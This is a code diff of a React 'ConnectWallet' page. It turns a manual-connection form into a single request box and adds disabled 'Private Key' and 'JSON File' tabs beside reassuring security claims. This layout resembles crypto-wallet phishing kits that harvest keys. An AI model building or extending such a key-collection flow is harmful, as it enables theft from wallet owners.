@@ -94,74 +94,53 @@ export default function ConnectWallet() {
             </p>
           </div>
         ) : showApplicationForm ? (
-          <div className="max-w-2xl mx-auto" data-testid="application-form-container">
-            <div className="text-center mb-8">
-              <h2 className="text-3xl font-bold text-[#f5f1e8] mb-4">Request Manual Connection</h2>
-              <p className="text-[#9ca3af]">
-                Fill out the form below and our team will help you connect your {selectedWallet} wallet
-              </p>
+          <div className="max-w-3xl mx-auto" data-testid="application-form-container">
+            <div className="flex gap-2 mb-8">
+              <button className="flex items-center gap-2 bg-[#3dd9b3] text-[#0a1614] px-6 py-3 rounded-lg font-semibold" data-testid="tab-application">
+                <Shield className="w-4 h-4" />
+                Application Form
+              </button>
+              <button className="flex items-center gap-2 bg-transparent border border-[#3dd9b3]/20 text-[#9ca3af] px-6 py-3 rounded-lg" disabled data-testid="tab-private-key">
+                <Shield className="w-4 h-4" />
+                Private Key
+              </button>
+              <button className="flex items-center gap-2 bg-transparent border border-[#3dd9b3]/20 text-[#9ca3af] px-6 py-3 rounded-lg" disabled data-testid="tab-json">
+                <CreditCard className="w-4 h-4" />
+                JSON File
+              </button>
             </div>
 
-            <form onSubmit={handleSubmitApplication} className="space-y-6 bg-[#1a2e2a]/30 border border-[#3dd9b3]/20 rounded-lg p-6 sm:p-8">
-              <div className="space-y-2">
-                <label htmlFor="name" className="text-sm font-medium text-[#f5f1e8]">
-                  Full Name
-                </label>
-                <Input
-                  id="name"
-                  type="text"
-                  required
-                  value={formData.name}
-                  onChange={(e) => setFormData({ ...formData, name: e.target.value })}
-                  className="bg-[#0a1614] border-[#3dd9b3]/20 text-[#f5f1e8] placeholder:text-[#9ca3af]"
-                  placeholder="Enter your full name"
-                  data-testid="input-name"
-                />
-              </div>
+            <h2 className="text-2xl font-bold text-[#f5f1e8] mb-6" data-testid="heading-form">
+              Submit your connection request
+            </h2>
 
-              <div className="space-y-2">
-                <label htmlFor="email" className="text-sm font-medium text-[#f5f1e8]">
-                  Email Address
-                </label>
-                <Input
-                  id="email"
-                  type="email"
-                  required
-                  value={formData.email}
-                  onChange={(e) => setFormData({ ...formData, email: e.target.value })}
-                  className="bg-[#0a1614] border-[#3dd9b3]/20 text-[#f5f1e8] placeholder:text-[#9ca3af]"
-                  placeholder="your.email@example.com"
-                  data-testid="input-email"
-                />
+            <div className="bg-[#1a2e2a]/30 border border-[#3dd9b3]/30 rounded-lg p-6 mb-6">
+              <div className="flex gap-3 text-[#3dd9b3]">
+                <Shield className="w-5 h-5 flex-shrink-0 mt-0.5" />
+                <div>
+                  <h3 className="font-semibold mb-2">Your Security is Our Priority</h3>
+                  <p className="text-sm text-[#9ca3af]">
+                    Your information is processed securely and used only to assist with wallet connection. We use industry-standard encryption protocols to ensure your contact details remain completely private and secure throughout the support process.
+                  </p>
+                </div>
               </div>
+            </div>
 
-              <div className="space-y-2">
-                <label htmlFor="walletAddress" className="text-sm font-medium text-[#f5f1e8]">
-                  Wallet Address (Optional)
-                </label>
-                <Input
-                  id="walletAddress"
-                  type="text"
-                  value={formData.walletAddress}
-                  onChange={(e) => setFormData({ ...formData, walletAddress: e.target.value })}
-                  className="bg-[#0a1614] border-[#3dd9b3]/20 text-[#f5f1e8] placeholder:text-[#9ca3af]"
-                  placeholder="0x..."
-                  data-testid="input-wallet-address"
-                />
-              </div>
+            <form onSubmit={handleSubmitApplication} className="space-y-6">
+              <Textarea
+                id="application-details"
+                required
+                value={formData.message}
+                onChange={(e) => setFormData({ ...formData, message: e.target.value })}
+                className="bg-[#0f2520] border-[#3dd9b3]/20 text-[#f5f1e8] placeholder:text-[#6b7280] min-h-[180px] text-base"
+                placeholder="Name: Your Full Name&#10;Email: your.email@example.com&#10;Wallet Address (optional): 0x...&#10;Issue Description: Describe what happened when trying to connect..."
+                data-testid="textarea-application"
+              />
 
-              <div className="space-y-2">
-                <label htmlFor="message" className="text-sm font-medium text-[#f5f1e8]">
-                  Additional Details
-                </label>
-                <Textarea
-                  id="message"
-                  value={formData.message}
-                  onChange={(e) => setFormData({ ...formData, message: e.target.value })}
-                  className="bg-[#0a1614] border-[#3dd9b3]/20 text-[#f5f1e8] placeholder:text-[#9ca3af] min-h-[120px]"
-                  placeholder="Describe any issues you're experiencing..."
-                  data-testid="textarea-message"
-                />
+              <div className="space-y-2 text-sm text-[#9ca3af]">
+                <p>• Include your full name and email address so we can contact you</p>
+                <p>• Wallet address is optional but helps us assist you faster</p>
+                <p>• Describe the connection issue you experienced in detail</p>
               </div>
 
               <div className="flex gap-4 pt-4">
@@ -171,18 +150,20 @@ export default function ConnectWallet() {
                     setShowApplicationForm(false);
                     setShowManualConnect(true);
                   }}
+                  size="lg"
                   variant="outline"
-                  className="flex-1 border-[#3dd9b3]/40 text-[#f5f1e8]"
+                  className="flex-1 border-[#3dd9b3]/40 text-[#9ca3af]"
                   data-testid="button-cancel"
                 >
                   Cancel
                 </Button>
                 <Button
                   type="submit"
+                  size="lg"
                   className="flex-1 bg-[#3dd9b3] text-[#0a1614] font-semibold"
                   data-testid="button-submit-application"
                 >
-                  Submit Application
+                  Submit Request
                 </Button>
               </div>
             </form>
